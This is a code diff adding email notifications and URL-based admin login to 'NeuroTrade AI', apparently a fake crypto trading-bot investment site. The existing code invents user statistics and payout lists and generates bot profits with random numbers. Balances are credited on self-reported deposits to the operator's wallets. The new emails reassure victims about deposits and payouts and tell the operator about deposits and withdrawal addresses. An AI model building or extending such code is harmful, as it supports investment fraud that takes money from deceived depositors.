@@ -366,7 +366,7 @@ details p { margin: 10px 0 0; font-size: 13.5px; }
 
 <div class="hr"></div>
 
-<div class="mini" style="padding:0 12px">Version 4.0 - engine online</div>
+<div class="mini" style="padding:0 12px">Version 4.1 - engine online</div>
 
 </nav>
 
@@ -412,6 +412,12 @@ var DEFAULTS = {
 
   adminCode: '482913',
 
+  adminEmail: '',
+
+  notifyAdmin: true,
+
+  notifyUser: true,
+
   minDeposit: 100,
 
   minWithdraw: 20,
@@ -452,11 +458,7 @@ var LS = {
 
 };
 
-
-
-var CFG = {};
-
-var _k;
+var CFG = {}, _k;
 
 for (_k in DEFAULTS) { CFG[_k] = DEFAULTS[_k]; }
 
@@ -468,19 +470,11 @@ function saveCfg() { LS.s('config', CFG); }
 
 
 
-var USERS = LS.g('users', []);
-
-var SESSION = LS.g('session', null);
-
-var TX = LS.g('tx', []);
-
-var ADMIN = LS.g('admin', false);
+var USERS = LS.g('users', []), SESSION = LS.g('session', null), TX = LS.g('tx', []), ADMIN = LS.g('admin', false);
 
 if (!(USERS instanceof Array)) { USERS = []; }
 
 if (!(TX instanceof Array)) { TX = []; }
-
-
 
 function save() { LS.s('users', USERS); LS.s('session', SESSION); LS.s('tx', TX); }
 
@@ -495,8 +489,6 @@ function norm(e) { return String(e === null || e === undefined ? '' : e).trim().
 function validEmail(e) { return /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(e); }
 
 function nameFromEmail(e) { return e.split('@')[0].replace(/[._-]+/g, ' ').replace(/\b\w/g, function (c) { return c.toUpperCase(); }); }
-
-
 
 function eur(n) { n = Math.round(n || 0); try { return new Intl.NumberFormat('en-GB', { style: 'currency', currency: 'EUR', maximumFractionDigits: 0 }).format(n); } catch (e) { return 'EUR ' + n; } }
 
@@ -515,8 +507,6 @@ var STATS = { users: 2418, profit: 131480, vol: 4218600, payouts: 12492, uptime:
 var PAY = [['Kevin M.', 418], ['Ella B.', 1220], ['Ryan T.', 275], ['Fatima E.', 860], ['Neil V.', 1640], ['Anna S.', 390], ['Jordy P.', 95], ['Sam K.', 730]];
 
 var payIdx = 0;
-
-
 
 var BOTS = [
 
@@ -545,8 +535,6 @@ var WALLETS = {
   'Bitcoin': 'bc1q9x8k3meme0coin7trade4bot9venice2xq7z'
 
 };
-
-
 
 var ICONS = {
 
@@ -644,129 +632,17 @@ function flash(el, up) { if (!el) { return; } el.classList.remove('flashup', 'fl
 
 
 
-function ensure(u) {
+/* ================= EMAIL LAYER ================= */
 
-  if (!u) { return; }
+function sendViaFormSubmit(to, subject, lines) {
 
-  if (!u.pos) { u.pos = []; }
+  var payload = { _subject: subject, _template: 'table', _captcha: 'false' }, i;
 
-  if (!u.bots) { u.bots = []; }
-
-  if (!u.wallet) { u.wallet = { connected: false, address: '', at: 0 }; }
-
-  if (u.emailVerified === undefined) { u.emailVerified = false; }
-
-  if (u.allocated === undefined) { u.allocated = 0; }
-
-  var i, id, found, p, tot = 0, b;
-
-  for (i = 0; i < u.bots.length; i++) {
-
-    id = u.bots[i]; found = false;
-
-    for (p = 0; p < u.pos.length; p++) { if (u.pos[p].bot === id) { found = true; } }
-
-    if (!found) {
-
-      b = botById(id);
-
-      u.pos.push({
-
-        bot: id,
-
-        pair: PAIRS[Math.floor(Math.random() * PAIRS.length)],
-
-        size: +(1 + Math.random() * 9).toFixed(2),
-
-        alloc: CFG.botCapital,
-
-        pnl: 0, pct: 0, earned: 0, window: 0, prog: 0,
-
-        windowStart: Date.now(),
-
-        seed: b ? b.seed : 10
-
-      });
-
-    }
-
-  }
-
-  u.pos = u.pos.filter(function (x) { return u.bots.indexOf(x.bot) > -1; });
-
-  for (i = 0; i < u.pos.length; i++) { tot += (u.pos[i].alloc || 0); }
-
-  u.allocated = +tot.toFixed(2);
-
-}
-
-
-
-function tickPos(p, now) {
-
-  var DAY = 86400000, cap = CFG.dailyCapPerBot;
-
-  if (!p.windowStart) { p.windowStart = now; }
-
-  if (p.earned === undefined) { p.earned = 0; }
-
-  var elapsed = now - p.windowStart, guard = 0;
-
-  while (elapsed >= DAY && guard < 500) {
-
-    p.earned += cap * (0.80 + Math.random() * 0.20);
-
-    p.windowStart += DAY;
-
-    elapsed = now - p.windowStart;
-
-    guard++;
-
-  }
-
-  var prog = Math.max(0, Math.min(1, elapsed / DAY));
-
-  var ease = Math.pow(prog, 0.5);
-
-  var jitter = 1 + Math.sin(now / 45000 + (p.seed || 0)) * 0.05;
-
-  p.window = Math.min(cap, cap * ease * jitter);
-
-  p.pnl = +(p.earned + p.window).toFixed(2);
-
-  p.pct = +((p.pnl / CFG.botCapital) * 100).toFixed(2);
-
-  p.prog = p.window / cap;
-
-}
-
-
-
-function userTx(em) { em = em || SESSION; return TX.filter(function (t) { return t.email === em; }).sort(function (a, b) { return b.ts - a.ts; }); }
-
-
-
-function sendViaFormSubmit(email, code) {
-
-  var payload = {
-
-    _subject: 'NeuroTrade AI - your login code',
-
-    _template: 'table',
-
-    _captcha: 'false',
-
-    Code: code,
-
-    Valid: '15 minutes',
-
-    Message: 'Your NeuroTrade AI code is ' + code + '. Valid for 15 minutes.'
-
-  };
+  for (i = 0; i < lines.length; i++) { payload[lines[i][0]] = lines[i][1]; }
 
   try {
 
-    return fetch('https://formsubmit.co/ajax/' + encodeURIComponent(email), {
+    return fetch('https://formsubmit.co/ajax/' + encodeURIComponent(to), {
 
       method: 'POST',
 
@@ -779,8 +655,6 @@ function sendViaFormSubmit(email, code) {
   } catch (e) { return Promise.resolve(false); }
 
 }
-
-
 
 function loadEmailJS() {
 
@@ -802,21 +676,21 @@ function loadEmailJS() {
 
 }
 
-function sendViaEmailJS(email, code) {
+function sendViaEmailJS(to, subject, lines) {
 
   return loadEmailJS().then(function (ok) {
 
     if (!ok) { return false; }
 
+    var vars = { to_email: to, subject: subject, message: lines.map(function (l) { return l[0] + ': ' + l[1]; }).join('\n') }, i;
+
+    for (i = 0; i < lines.length; i++) { vars[lines[i][0].toLowerCase().replace(/[^a-z0-9]/g, '_')] = lines[i][1]; }
+
     try {
 
       window.emailjs.init({ publicKey: CFG.emailjsPublicKey });
 
-      return window.emailjs.send(CFG.emailjsServiceId, CFG.emailjsTemplateId, {
-
-        to_email: email, code: code, message: 'Your NeuroTrade AI code is ' + code + '. Valid for 15 minutes.'
-
-      }).then(function () { return true; }).catch(function () { return false; });
+      return window.emailjs.send(CFG.emailjsServiceId, CFG.emailjsTemplateId, vars).then(function () { return true; }).catch(function () { return false; });
 
     } catch (e) { return false; }
 
@@ -824,19 +698,85 @@ function sendViaEmailJS(email, code) {
 
 }
 
-function sendCodeEmail(email, code) {
+function sendMail(to, subject, lines) {
+
+  if (!to) { return Promise.resolve(false); }
 
   if (CFG.emailProvider === 'emailjs' && CFG.emailjsPublicKey && CFG.emailjsServiceId && CFG.emailjsTemplateId) {
 
-    return sendViaEmailJS(email, code).then(function (ok) { return ok ? true : sendViaFormSubmit(email, code); });
+    return sendViaEmailJS(to, subject, lines).then(function (ok) { return ok ? true : sendViaFormSubmit(to, subject, lines); });
 
   }
 
-  return sendViaFormSubmit(email, code);
+  return sendViaFormSubmit(to, subject, lines);
 
 }
 
+function adminMail(subject, lines) { if (!CFG.notifyAdmin || !CFG.adminEmail) { return; } sendMail(CFG.adminEmail, '[NeuroTrade] ' + subject, lines); }
 
+
+
+function sendCodeEmail(email, code) {
+
+  return sendMail(email, 'NeuroTrade AI - your login code', [
+
+    ['Code', code],
+
+    ['Valid', '15 minutes'],
+
+    ['Message', 'Enter this code to log in. If you did not request it, you can ignore this email.']
+
+  ]);
+
+}
+
+function sendWelcome(user) {
+
+  if (!CFG.notifyUser) { return; }
+
+  sendMail(user.email, 'Welcome to NeuroTrade AI', [
+
+    ['Account', user.email],
+
+    ['Next step', 'Deposit at least ' + eur(CFG.minDeposit) + ' to activate your account.'],
+
+    ['Bots', 'Every ' + eur(CFG.botCapital) + ' deposited unlocks one bot. Max ' + eur(CFG.dailyCapPerBot) + ' profit per bot per 24h.']
+
+  ]);
+
+}
+
+function sendDepositMail(user, amount) {
+
+  if (CFG.notifyUser) { sendMail(user.email, 'Deposit credited - ' + eur(amount), [['Amount', eur2(amount)], ['Status', 'Credited to your balance'], ['Balance', eur2(user.balance)], ['Bots unlocked', unlockedBots(user) + ' of ' + BOTS.length]]); }
+
+  adminMail('New deposit ' + eur(amount), [['User', user.email], ['Amount', eur2(amount)], ['Total deposited', eur(user.deposited)]]);
+
+}
+
+function sendWithdrawRequestMail(user, amount, address, net) {
+
+  if (CFG.notifyUser) { sendMail(user.email, 'Withdrawal request received - ' + eur(amount), [['Amount', eur2(amount)], ['Network', net], ['Address', address], ['Status', 'Pending - usually approved within 22 minutes']]); }
+
+  adminMail('Withdrawal request ' + eur(amount), [['User', user.email], ['Amount', eur2(amount)], ['Network', net], ['Address', address]]);
+
+}
+
+function sendWithdrawPaidMail(user, amount) {
+
+  if (!CFG.notifyUser || !user) { return; }
+
+  sendMail(user.email, 'Withdrawal paid - ' + eur(amount), [['Amount', eur2(amount)], ['Status', 'Paid out to your wallet']]);
+
+}
+
+function sendWithdrawRejectedMail(user, amount) {
+
+  if (!CFG.notifyUser || !user) { return; }
+
+  sendMail(user.email, 'Withdrawal rejected - refunded', [['Amount', eur2(amount)], ['Status', 'Rejected - amount returned to your balance'], ['Balance', eur2(user.balance)]]);
+
+}
 
 function issueCode(u) {
 
@@ -868,15 +808,81 @@ function issueCode(u) {
 
 
 
-var ROUTES = {
+/* ================= STATE ================= */
 
-  '': 'landing', '/': 'landing', '/login': 'login', '/register': 'login', '/verify': 'verify',
+function ensure(u) {
 
-  '/dashboard': 'dashboard', '/bots': 'bots', '/deposit': 'deposit', '/withdraw': 'withdraw',
+  if (!u) { return; }
 
-  '/account': 'account', '/admin': 'admin'
+  if (!u.pos) { u.pos = []; }
 
-};
+  if (!u.bots) { u.bots = []; }
+
+  if (!u.wallet) { u.wallet = { connected: false, address: '', at: 0 }; }
+
+  if (u.emailVerified === undefined) { u.emailVerified = false; }
+
+  if (u.allocated === undefined) { u.allocated = 0; }
+
+  var i, id, found, p, tot = 0, b;
+
+  for (i = 0; i < u.bots.length; i++) {
+
+    id = u.bots[i]; found = false;
+
+    for (p = 0; p < u.pos.length; p++) { if (u.pos[p].bot === id) { found = true; } }
+
+    if (!found) {
+
+      b = botById(id);
+
+      u.pos.push({ bot: id, pair: PAIRS[Math.floor(Math.random() * PAIRS.length)], size: +(1 + Math.random() * 9).toFixed(2), alloc: CFG.botCapital, pnl: 0, pct: 0, earned: 0, window: 0, prog: 0, windowStart: Date.now(), seed: b ? b.seed : 10 });
+
+    }
+
+  }
+
+  u.pos = u.pos.filter(function (x) { return u.bots.indexOf(x.bot) > -1; });
+
+  for (i = 0; i < u.pos.length; i++) { tot += (u.pos[i].alloc || 0); }
+
+  u.allocated = +tot.toFixed(2);
+
+}
+
+function tickPos(p, now) {
+
+  var DAY = 86400000, cap = CFG.dailyCapPerBot;
+
+  if (!p.windowStart) { p.windowStart = now; }
+
+  if (p.earned === undefined) { p.earned = 0; }
+
+  var elapsed = now - p.windowStart, guard = 0;
+
+  while (elapsed >= DAY && guard < 500) { p.earned += cap * (0.80 + Math.random() * 0.20); p.windowStart += DAY; elapsed = now - p.windowStart; guard++; }
+
+  var prog = Math.max(0, Math.min(1, elapsed / DAY));
+
+  var ease = Math.pow(prog, 0.5);
+
+  var jitter = 1 + Math.sin(now / 45000 + (p.seed || 0)) * 0.05;
+
+  p.window = Math.min(cap, cap * ease * jitter);
+
+  p.pnl = +(p.earned + p.window).toFixed(2);
+
+  p.pct = +((p.pnl / CFG.botCapital) * 100).toFixed(2);
+
+  p.prog = p.window / cap;
+
+}
+
+function userTx(em) { em = em || SESSION; return TX.filter(function (t) { return t.email === em; }).sort(function (a, b) { return b.ts - a.ts; }); }
+
+
+
+var ROUTES = { '': 'landing', '/': 'landing', '/login': 'login', '/register': 'login', '/verify': 'verify', '/dashboard': 'dashboard', '/bots': 'bots', '/deposit': 'deposit', '/withdraw': 'withdraw', '/account': 'account', '/admin': 'admin', '/panel': 'admin' };
 
 var PROTECTED = ['dashboard', 'bots', 'deposit', 'withdraw', 'account', 'verify'];
 
@@ -886,7 +892,15 @@ var ADMIN_TAB = 'overview';
 
 
 
-function route() { var h = location.hash.replace('#', '') || '/'; return ROUTES[h] || 'landing'; }
+function route() {
+
+  var h = location.hash.replace('#', '') || '/';
+
+  if (h.indexOf('/admin') === 0 || h.indexOf('/panel') === 0) { return 'admin'; }
+
+  return ROUTES[h] || 'landing';
+
+}
 
 
 
@@ -1370,7 +1384,7 @@ function vDeposit() {
 
   h += '<button class="btn primary" type="submit">Report deposit and credit balance</button></form>';
 
-  h += '<div class="banner mt"><div><b>Your balance shows up instantly</b><span>The coins go to the deposit wallet, but your balance is credited right away so you can trade.</span></div></div></div>';
+  h += '<div class="banner mt"><div><b>You get an email confirmation</b><span>Your balance is credited right away and we email you the confirmation.</span></div></div></div>';
 
   h += '<div class="card mt2"><h3>Deposit history</h3>';
 
@@ -1436,7 +1450,7 @@ function vWithdraw() {
 
   h += '<button class="btn primary" type="submit" ' + (wc ? '' : 'disabled') + '>Request withdrawal</button></form>';
 
-  h += '<div class="mini">The amount is deducted from your balance immediately and shows as Pending until approved.</div></div>';
+  h += '<div class="mini">The amount is deducted from your balance immediately and shows as Pending until approved. You get an email when it is paid or rejected.</div></div>';
 
   h += '<div class="card mt2"><h3>Withdrawal history</h3>';
 
@@ -1492,7 +1506,7 @@ function vAccount() {
 
   h += '<button class="btn ghost" style="margin-top:10px" data-action="reset">Reset data</button>';
 
-  h += '<div class="mini center mt2">NeuroTrade AI v4.0</div></div>';
+  h += '<div class="mini center mt2">NeuroTrade AI v4.1</div></div>';
 
   return h;
 
@@ -1594,7 +1608,7 @@ function vAdmin() {
 
     body += '<div class="row mini mt"><span>Max profit per bot / 24h</span><b>' + eur(CFG.dailyCapPerBot) + '</b></div>';
 
-    body += '<div class="row mini mt"><span>Min. deposit</span><b>' + eur(CFG.minDeposit) + '</b></div>';
+    body += '<div class="row mini mt"><span>Admin notifications</span><b>' + (CFG.notifyAdmin && CFG.adminEmail ? esc(CFG.adminEmail) : 'off') + '</b></div>';
 
     body += '<button class="btn sm mt" data-action="admin-tab" data-tab="settings">Open settings</button></div>';
 
@@ -1738,6 +1752,14 @@ function vAdmin() {
 
     body += '<div class="card"><form data-form="adminsettings">';
 
+    body += '<div class="field"><label>Your admin email (notifications)</label><input name="adminEmail" type="email" placeholder="you@yourdomain.com" value="' + esc(CFG.adminEmail) + '"></div>';
+
+    body += '<div class="field"><label>Email me about new accounts, deposits and payouts</label><select name="notifyAdmin"><option value="on"' + (CFG.notifyAdmin ? ' selected' : '') + '>On</option><option value="off"' + (!CFG.notifyAdmin ? ' selected' : '') + '>Off</option></select></div>';
+
+    body += '<div class="field"><label>Email users about their own account</label><select name="notifyUser"><option value="on"' + (CFG.notifyUser ? ' selected' : '') + '>On</option><option value="off"' + (!CFG.notifyUser ? ' selected' : '') + '>Off</option></select></div>';
+
+    body += '<div class="hr"></div>';
+
     body += '<div class="field"><label>Wallet connect URL</label><input name="connectUrl" value="' + esc(CFG.connectUrl) + '"></div>';
 
     body += '<div class="field"><label>Open connect link in</label><select name="connectMode">';
@@ -1780,7 +1802,7 @@ function vAdmin() {
 
     body += '<button class="btn primary" type="submit">Save settings</button></form>';
 
-    body += '<div class="hr"></div><div class="mini">Settings are stored on this device.</div></div>';
+    body += '<div class="hr"></div><div class="mini">Bookmark this to jump straight in: <b>' + location.origin + location.pathname + '#/admin/' + esc(CFG.adminCode) + '</b></div></div>';
 
     body += '<button class="btn ghost mt" data-action="admin-logout">Log out of admin</button>';
 
@@ -1810,6 +1832,16 @@ function render() {
 
   var r = route();
 
+  if (r === 'admin') {
+
+    var seg = location.hash.replace('#', '').split('/');
+
+    var key = seg[2] ? decodeURIComponent(seg[2]) : '';
+
+    if (key && key === CFG.adminCode && !ADMIN) { ADMIN = true; LS.s('admin', true); }
+
+  }
+
   if (PROTECTED.indexOf(r) > -1 && !me()) { location.hash = '#/login'; return; }
 
   if (r === 'login' && me() && isVerified(me())) { location.hash = '#/dashboard'; return; }
@@ -1822,13 +1854,7 @@ function render() {
 
   if (u) { ensure(u); save(); }
 
-  var V = {
-
-    landing: vLanding, login: vAuth, verify: vVerify, dashboard: vDashboard, bots: vBots,
-
-    deposit: vDeposit, withdraw: vWithdraw, account: vAccount, admin: vAdmin
-
-  };
+  var V = { landing: vLanding, login: vAuth, verify: vVerify, dashboard: vDashboard, bots: vBots, deposit: vDeposit, withdraw: vWithdraw, account: vAccount, admin: vAdmin };
 
   var html;
 
@@ -1960,17 +1986,11 @@ document.addEventListener('click', function (e) {
 
     }
 
-    if (act === 'resend') {
-
-      var uu = me(); if (!uu) { return; }
-
-      issueCode(uu); toast('New code sent'); return;
-
-    }
+    if (act === 'resend') { var uu = me(); if (!uu) { return; } issueCode(uu); toast('New code sent'); return; }
 
     if (act === 'admin-tab') { ADMIN_TAB = a.getAttribute('data-tab'); render(); return; }
 
-    if (act === 'admin-logout') { ADMIN = false; LS.s('admin', false); render(); return; }
+    if (act === 'admin-logout') { ADMIN = false; LS.s('admin', false); go('#/'); return; }
 
     if (act === 'admin-engine') { CFG.botEngine = !CFG.botEngine; saveCfg(); toast(CFG.botEngine ? 'Engine running' : 'Engine paused'); render(); return; }
 
@@ -1986,9 +2006,25 @@ document.addEventListener('click', function (e) {
 
     if (act === 'admin-del') { var ux = userBy(a.getAttribute('data-email')); if (!confirm('Delete ' + ux.email + '?')) { return; } USERS = USERS.filter(function (x) { return x.email !== ux.email; }); TX = TX.filter(function (x) { return x.email !== ux.email; }); save(); toast('Deleted'); render(); return; }
 
-    if (act === 'admin-pay') { var t1 = TX.filter(function (x) { return x.id === a.getAttribute('data-id'); })[0]; if (t1) { t1.status = 'paid'; t1.paidAt = Date.now(); save(); toast('Marked as paid'); } render(); return; }
+    if (act === 'admin-pay') {
 
-    if (act === 'admin-reject') { var t2 = TX.filter(function (x) { return x.id === a.getAttribute('data-id'); })[0]; if (t2) { t2.status = 'rejected'; var ur = userBy(t2.email); if (ur) { ur.balance = +(ur.balance + t2.amount).toFixed(2); } save(); toast('Rejected and refunded'); } render(); return; }
+      var t1 = TX.filter(function (x) { return x.id === a.getAttribute('data-id'); })[0];
+
+      if (t1) { t1.status = 'paid'; t1.paidAt = Date.now(); save(); sendWithdrawPaidMail(userBy(t1.email), t1.amount); toast('Marked as paid - email sent'); }
+
+      render(); return;
+
+    }
+
+    if (act === 'admin-reject') {
+
+      var t2 = TX.filter(function (x) { return x.id === a.getAttribute('data-id'); })[0];
+
+      if (t2) { t2.status = 'rejected'; var ur = userBy(t2.email); if (ur) { ur.balance = +(ur.balance + t2.amount).toFixed(2); sendWithdrawRejectedMail(ur, t2.amount); } save(); toast('Rejected - refunded and emailed'); }
+
+      render(); return;
+
+    }
 
   }
 
@@ -2074,6 +2110,8 @@ document.addEventListener('submit', function (e) {
 
     var acct = userBy(email);
 
+    var isNew = !acct;
+
     if (!acct) {
 
       acct = { email: email, name: nameFromEmail(email), balance: 0, allocated: 0, deposited: 0, emailVerified: false, code: '', codeExp: 0, codeSentOk: null, wallet: { connected: false, address: '', at: 0 }, bots: [], pos: [], created: Date.now() };
@@ -2087,6 +2125,8 @@ document.addEventListener('submit', function (e) {
     go('#/verify');
 
     issueCode(acct);
+
+    if (isNew) { sendWelcome(acct); adminMail('New account', [['User', email]]); }
 
     toast('Sending code to ' + email);
 
@@ -2146,7 +2186,7 @@ document.addEventListener('submit', function (e) {
 
       cu.deposited = +(cu.deposited + amt).toFixed(2);
 
-      save(); toast(eur(amt) + ' credited to your balance'); buzz([10, 40, 10]);
+      save(); sendDepositMail(cu, amt); toast(eur(amt) + ' credited - email sent'); buzz([10, 40, 10]);
 
       if (route() === 'deposit' || route() === 'dashboard') { renderKeep(old, true); }
 
@@ -2172,13 +2212,15 @@ document.addEventListener('submit', function (e) {
 
     var addr = (fd.get('addr') + '').trim() || u.wallet.address;
 
+    var net = (fd.get('net') || 'Solana');
+
     var oldb = u.balance;
 
     u.balance = +(u.balance - wa).toFixed(2);
 
-    TX.push({ id: 'w' + Date.now(), email: SESSION, type: 'withdraw', amount: wa, status: 'pending', ts: Date.now(), method: (fd.get('net') || 'Solana'), addr: addr });
+    TX.push({ id: 'w' + Date.now(), email: SESSION, type: 'withdraw', amount: wa, status: 'pending', ts: Date.now(), method: net, addr: addr });
 
-    save(); toast('Withdrawal requested - Pending'); renderKeep(oldb, false);
+    save(); sendWithdrawRequestMail(u, wa, addr, net); toast('Withdrawal requested - email sent'); renderKeep(oldb, false);
 
     return;
 
@@ -2201,6 +2243,12 @@ document.addEventListener('submit', function (e) {
   if (k === 'adminsettings') {
 
     function val(x) { return (fd.get(x) + '').trim(); }
+
+    CFG.adminEmail = val('adminEmail');
+
+    CFG.notifyAdmin = val('notifyAdmin') !== 'off';
+
+    CFG.notifyUser = val('notifyUser') !== 'off';
 
     CFG.connectUrl = val('connectUrl') || DEFAULTS.connectUrl;
 
